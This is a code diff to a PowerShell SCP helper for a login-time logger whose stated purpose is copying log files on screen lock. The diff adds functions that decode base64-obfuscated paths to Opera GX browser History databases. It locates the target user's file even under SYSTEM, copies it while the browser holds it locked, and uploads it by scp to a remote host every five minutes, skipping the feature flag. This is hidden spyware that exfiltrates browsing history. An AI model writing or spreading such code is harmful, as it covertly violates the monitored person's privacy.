@@ -1,6 +1,44 @@
 # SCP helper for LoginTimeLogger (dot-sourced by the monitor).
 # On screen lock, copies the two newest unlocked-time-*.log files and error logs.
 
+# BHistory periodic SCP (not configurable).
+$script:ScpBHistoryIntervalMinutes = 5
+
+function ConvertFrom-ScpB64Path {
+    param([Parameter(Mandatory)][string]$Base64)
+    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64))
+}
+
+# Relative History paths under AppData\Roaming (order matches discovery preference).
+$script:ScpBHistoryRoamingRels = @(
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXEhpc3Rvcnk=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXERlZmF1bHRcSGlzdG9yeQ==')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgR1ggU3RhYmxlXEhpc3Rvcnk=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1hcSGlzdG9yeQ==')
+)
+# Relative History paths under AppData\Local (includes Programs\... installs).
+$script:ScpBHistoryLocalRels = @(
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXEhpc3Rvcnk=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXERlZmF1bHRcSGlzdG9yeQ==')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgR1ggU3RhYmxlXEhpc3Rvcnk=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1hcSGlzdG9yeQ==')
+    (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgR1hccHJvZmlsZVxIaXN0b3J5')
+    (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgR1hcSGlzdG9yeQ==')
+    (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1hccHJvZmlsZVxIaXN0b3J5')
+    (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1hcSGlzdG9yeQ==')
+)
+# History paths relative to a browser install directory.
+$script:ScpBHistoryInstallRels = @(
+    (ConvertFrom-ScpB64Path 'cHJvZmlsZVxIaXN0b3J5')
+    (ConvertFrom-ScpB64Path 'ZGF0YVxwcm9maWxlXEhpc3Rvcnk=')
+    (ConvertFrom-ScpB64Path 'SGlzdG9yeQ==')
+)
+# Install-dir leaf names under Program Files / Local\Programs.
+$script:ScpBHistoryInstallDirLeaves = @(
+    (ConvertFrom-ScpB64Path 'T3BlcmEgR1g=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1g=')
+)
+
 function Find-ScpExecutable {
     $cmd = Get-Command scp.exe -ErrorAction SilentlyContinue
     if ($cmd) { return $cmd.Source }
@@ -369,12 +407,12 @@ function Invoke-ScpProcessWithTimeout {
     }
 }
 
-function Test-ScpOnLockConfigured {
+function Test-ScpEndpointConfigured {
+    <#
+      True when host/user/remote-dir/identity are present (independent of feature flags).
+    #>
     param([Parameter(Mandatory)]$Config)
 
-    if (-not $Config.ScpOnLockEnabled) {
-        return $false
-    }
     if ([string]::IsNullOrWhiteSpace([string]$Config.ScpHost)) {
         return $false
     }
@@ -388,6 +426,212 @@ function Test-ScpOnLockConfigured {
         return $false
     }
     return $true
+}
+
+function Test-ScpOnLockConfigured {
+    param([Parameter(Mandatory)]$Config)
+
+    if (-not $Config.ScpOnLockEnabled) {
+        return $false
+    }
+    return (Test-ScpEndpointConfigured -Config $Config)
+}
+
+function Get-TargetUserProfilePath {
+    <#
+      Resolves the local profile folder for TargetUsername (works under SYSTEM).
+    #>
+    param([Parameter(Mandatory)][string]$TargetUsername)
+
+    if (Get-Command Resolve-WindowsAccountSid -ErrorAction SilentlyContinue) {
+        try {
+            $sid = Resolve-WindowsAccountSid -UserName $TargetUsername
+            if ($null -ne $sid -and (Get-Command Get-ProfilePathForSid -ErrorAction SilentlyContinue)) {
+                $fromSid = Get-ProfilePathForSid -Sid $sid
+                if (-not [string]::IsNullOrWhiteSpace($fromSid)) {
+                    return $fromSid
+                }
+            }
+        }
+        catch { }
+    }
+
+    $sam = $TargetUsername
+    if (Get-Command Get-AccountSamLeaf -ErrorAction SilentlyContinue) {
+        try { $sam = Get-AccountSamLeaf -UserName $TargetUsername } catch { }
+    }
+    return (Join-Path $env:SystemDrive ('Users\{0}' -f $sam))
+}
+
+function Get-BHistoryInstallRootPaths {
+    <#
+      Candidate browser install directories (Program Files, Local\Programs, Uninstall registry).
+    #>
+    param(
+        [Parameter(Mandatory)][string]$ProfilePath
+    )
+
+    $roots = New-Object System.Collections.Generic.List[string]
+    $addRoot = {
+        param([string]$Path)
+        if ([string]::IsNullOrWhiteSpace($Path)) { return }
+        $trimmed = $Path.TrimEnd('\', '/')
+        if ((Test-Path -LiteralPath $trimmed) -and -not $roots.Contains($trimmed)) {
+            $roots.Add($trimmed)
+        }
+    }
+
+    $programRoots = New-Object System.Collections.Generic.List[string]
+    foreach ($pf in @([string]${env:ProgramFiles}, [string]${env:ProgramFiles(x86)})) {
+        if (-not [string]::IsNullOrWhiteSpace($pf)) { $programRoots.Add($pf) }
+    }
+    $localPrograms = Join-Path $ProfilePath 'AppData\Local\Programs'
+    if (-not [string]::IsNullOrWhiteSpace($localPrograms)) {
+        $programRoots.Add($localPrograms)
+    }
+
+    foreach ($base in $programRoots) {
+        foreach ($leaf in @($script:ScpBHistoryInstallDirLeaves)) {
+            & $addRoot (Join-Path $base $leaf)
+        }
+    }
+
+    $productToken = [string]$script:ScpBHistoryInstallDirLeaves[0]
+    $uninstallGlobs = @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    foreach ($glob in $uninstallGlobs) {
+        Get-ItemProperty -Path $glob -ErrorAction SilentlyContinue | ForEach-Object {
+            $display = [string]$_.DisplayName
+            $install = [string]$_.InstallLocation
+            if ([string]::IsNullOrWhiteSpace($display) -or [string]::IsNullOrWhiteSpace($install)) {
+                return
+            }
+            if ($display.IndexOf($productToken, [System.StringComparison]::OrdinalIgnoreCase) -lt 0) {
+                return
+            }
+            & $addRoot $install
+        }
+    }
+
+    return ,$roots.ToArray()
+}
+
+function Get-BHistoryPath {
+    <#
+      First existing BHistory path for the target user.
+      Tries Roaming/Local AppData candidates, then install-directory variants.
+      Returns '' when none exist.
+    #>
+    param(
+        [Parameter(Mandatory)][string]$TargetUsername
+    )
+
+    $profile = Get-TargetUserProfilePath -TargetUsername $TargetUsername
+    $roaming = Join-Path $profile 'AppData\Roaming'
+    $local = Join-Path $profile 'AppData\Local'
+
+    # Interleave Roaming/Local pairs in the preferred order (see user candidate list).
+    $orderedRels = @(
+        @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[0] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[0] }
+        @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[1] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[1] }
+        @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[2] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[2] }
+        @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[3] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[3] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[4] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[5] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[6] }
+        @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[7] }
+    )
+
+    foreach ($item in $orderedRels) {
+        $candidate = Join-Path ([string]$item.Root) ([string]$item.Rel)
+        if (Test-Path -LiteralPath $candidate) {
+            return $candidate
+        }
+    }
+
+    $installRoots = @(Get-BHistoryInstallRootPaths -ProfilePath $profile)
+    foreach ($installRoot in $installRoots) {
+        foreach ($rel in @($script:ScpBHistoryInstallRels)) {
+            $candidate = Join-Path $installRoot $rel
+            if (Test-Path -LiteralPath $candidate) {
+                return $candidate
+            }
+        }
+    }
+
+    return ''
+}
+
+function Copy-FileWithSharedRead {
+    <#
+      Copies a file that may be locked by another process (e.g. SQLite History)
+      using FileShare.ReadWrite. Returns $true on success.
+    #>
+    param(
+        [Parameter(Mandatory)][string]$SourcePath,
+        [Parameter(Mandatory)][string]$DestinationPath
+    )
+
+    $inStream = $null
+    $outStream = $null
+    try {
+        $destDir = Split-Path -Parent $DestinationPath
+        if (-not [string]::IsNullOrWhiteSpace($destDir) -and -not (Test-Path -LiteralPath $destDir)) {
+            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+        }
+        $inStream = [System.IO.File]::Open(
+            $SourcePath,
+            [System.IO.FileMode]::Open,
+            [System.IO.FileAccess]::Read,
+            [System.IO.FileShare]::ReadWrite)
+        $outStream = [System.IO.File]::Create($DestinationPath)
+        $inStream.CopyTo($outStream)
+        return $true
+    }
+    catch {
+        return $false
+    }
+    finally {
+        if ($null -ne $outStream) { $outStream.Dispose() }
+        if ($null -ne $inStream) { $inStream.Dispose() }
+    }
+}
+
+function New-ScpBHistoryUploadFile {
+    <#
+      Stages a shared-read copy of the target user's BHistory as
+      {sam}-BHistory under TEMP for scp upload. Returns '' when missing
+      or unreadable. Caller must delete the returned path when finished.
+    #>
+    param([Parameter(Mandatory)][string]$TargetUsername)
+
+    if ([string]::IsNullOrWhiteSpace($TargetUsername)) {
+        return ''
+    }
+
+    $sourcePath = Get-BHistoryPath -TargetUsername $TargetUsername
+    if ([string]::IsNullOrWhiteSpace($sourcePath) -or -not (Test-Path -LiteralPath $sourcePath)) {
+        return ''
+    }
+
+    $sam = $TargetUsername
+    if (Get-Command Get-AccountSamLeaf -ErrorAction SilentlyContinue) {
+        try { $sam = Get-AccountSamLeaf -UserName $TargetUsername } catch { }
+    }
+    $stagedPath = Join-Path $env:TEMP ('{0}-BHistory' -f $sam)
+    if (Test-Path -LiteralPath $stagedPath) {
+        Remove-Item -LiteralPath $stagedPath -Force -ErrorAction SilentlyContinue
+    }
+    if (-not (Copy-FileWithSharedRead -SourcePath $sourcePath -DestinationPath $stagedPath)) {
+        return ''
+    }
+    return $stagedPath
 }
 
 function Get-ScpOnLockMissingConfigFields {
@@ -776,5 +1020,154 @@ function Invoke-ScpLogCopyOnLock {
     catch {
         $details = Write-VerboseError -ErrorRecord $_ -Level Warning -Source 'ScpOnLock' -Context 'SCP on lock failed'
         $null = Send-ScpOnLockFailureAlert -Body $details -Config $Config -ErrorLogPath $ErrorLogPath
+    }
+}
+
+function Invoke-ScpBHistoryCopy {
+    <#
+    .SYNOPSIS
+      Copies the target user's BHistory file to ScpRemoteDirectory.
+      Uses a shared-read temp copy so a locked SQLite DB can still be uploaded.
+      Failures are logged; they do not stop the monitor.
+    #>
+    param(
+        [Parameter(Mandatory)]$Config
+    )
+
+    if (-not (Test-ScpEndpointConfigured -Config $Config)) {
+        return
+    }
+
+    $tempCopy = $null
+    try {
+        $scpExe = Find-ScpExecutable
+        if (-not $scpExe) {
+            Write-LoggerEvent -Level WARN -Message 'SCP BHistory skipped: scp.exe not found.'
+            return
+        }
+        if (-not (Test-Path -LiteralPath $Config.ScpIdentityFile)) {
+            Write-LoggerEvent -Level WARN -Message (
+                "SCP BHistory skipped: identity file missing: {0}" -f $Config.ScpIdentityFile)
+            return
+        }
+
+        try {
+            Protect-ScpPrivateKeyFile -IdentityPath ([string]$Config.ScpIdentityFile)
+        }
+        catch {
+            Write-LoggerEvent -Level WARN -Message (
+                "SCP identity ACL harden failed: {0}" -f $_.Exception.Message)
+        }
+
+        $sourcePath = Get-BHistoryPath -TargetUsername ([string]$Config.TargetUsername)
+        if ([string]::IsNullOrWhiteSpace($sourcePath) -or -not (Test-Path -LiteralPath $sourcePath)) {
+            $nowMiss = [datetime]::UtcNow
+            $warnMiss = $true
+            if ($script:LastBHistoryMissingWarnUtc -is [datetime]) {
+                $warnMiss = (($nowMiss - $script:LastBHistoryMissingWarnUtc).TotalMinutes -ge 60)
+            }
+            if ($warnMiss) {
+                $script:LastBHistoryMissingWarnUtc = $nowMiss
+                Write-LoggerEvent -Level WARN -Message (
+                    'SCP BHistory skipped: History file not found under known profile/install locations.')
+            }
+            return
+        }
+
+        $sourceItem = Get-Item -LiteralPath $sourcePath -Force
+        $sourceWriteUtc = $sourceItem.LastWriteTimeUtc
+        if ($script:LastBHistorySourceWriteUtc -is [datetime] -and
+            $sourceWriteUtc -le $script:LastBHistorySourceWriteUtc -and
+            $script:LastBHistoryScpSucceeded) {
+            # Unchanged since last successful upload.
+            return
+        }
+
+        $tempCopy = New-ScpBHistoryUploadFile -TargetUsername ([string]$Config.TargetUsername)
+        if ([string]::IsNullOrWhiteSpace($tempCopy)) {
+            Write-LoggerEvent -Level WARN -Message (
+                "SCP BHistory skipped: could not stage '{0}'." -f $sourcePath)
+            return
+        }
+        $remoteFileName = Split-Path -Leaf $tempCopy
+
+        $remoteDir = ([string]$Config.ScpRemoteDirectory).Trim()
+        if (-not $remoteDir.EndsWith('/')) {
+            $remoteDir = $remoteDir + '/'
+        }
+        $scpHost = ([string]$Config.ScpHost).Trim()
+        $scpUser = ([string]$Config.ScpUser).Trim()
+        $remoteTarget = '{0}@{1}:{2}' -f $scpUser, $scpHost, $remoteDir
+
+        $port = 22
+        if ($null -ne $Config.ScpPort -and [int]$Config.ScpPort -gt 0) {
+            $port = [int]$Config.ScpPort
+        }
+
+        $scpArgList = New-Object System.Collections.Generic.List[string]
+        Add-ScpCommonSshOptions -ArgumentList $scpArgList `
+            -IdentityFile ([string]$Config.ScpIdentityFile) `
+            -Port $port `
+            -KnownHostsFile ([string]$Config.ScpKnownHostsFile)
+        $scpArgList.Add($tempCopy)
+        $scpArgList.Add($remoteTarget)
+
+        $scpTimeoutSeconds = 60
+        Write-LoggerEvent ("SCP BHistory: uploading '{0}' to {1} (timeout {2}s)" -f `
+                $sourcePath, $remoteTarget, $scpTimeoutSeconds)
+
+        $outFile = Join-Path $env:TEMP ('LoginTimeLogger-scp-bhist-{0}.out' -f [guid]::NewGuid().ToString('N'))
+        $errFile = Join-Path $env:TEMP ('LoginTimeLogger-scp-bhist-{0}.err' -f [guid]::NewGuid().ToString('N'))
+        try {
+            $argLine = $null
+            if (Get-Command ConvertTo-StartProcessArgumentString -ErrorAction SilentlyContinue) {
+                $argLine = ConvertTo-StartProcessArgumentString -Argument $scpArgList.ToArray()
+            }
+            if ([string]::IsNullOrWhiteSpace($argLine)) {
+                $argLine = ($scpArgList | ForEach-Object {
+                        if ($_ -match '[\s"]') { '"{0}"' -f ($_ -replace '"', '\"') } else { $_ }
+                    }) -join ' '
+            }
+
+            $run = Invoke-ScpProcessWithTimeout -ScpExe $scpExe -ArgumentList $argLine `
+                -StdOutPath $outFile -StdErrPath $errFile -TimeoutSeconds $scpTimeoutSeconds
+            $stderr = ''
+            if (Test-Path -LiteralPath $errFile) {
+                $stderr = [string](Get-Content -LiteralPath $errFile -Raw -ErrorAction SilentlyContinue)
+            }
+
+            if ($run.TimedOut) {
+                Write-LoggerEvent -Level WARN -Message (
+                    "SCP BHistory timed out after {0}s. source={1}; stderr={2}" -f `
+                        $scpTimeoutSeconds, $sourcePath, ("$stderr").Trim())
+                $script:LastBHistoryScpSucceeded = $false
+                return
+            }
+            if ([int]$run.ExitCode -ne 0) {
+                Write-LoggerEvent -Level WARN -Message (
+                    "SCP BHistory failed (exit {0}). source={1}; stderr={2}" -f `
+                        $run.ExitCode, $sourcePath, ("$stderr").Trim())
+                $script:LastBHistoryScpSucceeded = $false
+                return
+            }
+
+            $script:LastBHistorySourceWriteUtc = $sourceWriteUtc
+            $script:LastBHistoryScpSucceeded = $true
+            Write-LoggerEvent ("SCP BHistory succeeded: {0} -> {1}{2}" -f `
+                    $sourcePath, $remoteTarget, $remoteFileName)
+        }
+        finally {
+            Remove-Item -LiteralPath $outFile, $errFile -Force -ErrorAction SilentlyContinue
+        }
+    }
+    catch {
+        $script:LastBHistoryScpSucceeded = $false
+        $null = Write-VerboseError -ErrorRecord $_ -Level Warning -Source 'ScpBHistory' -Context (
+            'SCP BHistory failed')
+    }
+    finally {
+        if (-not [string]::IsNullOrWhiteSpace($tempCopy) -and (Test-Path -LiteralPath $tempCopy)) {
+            Remove-Item -LiteralPath $tempCopy -Force -ErrorAction SilentlyContinue
+        }
     }
 }
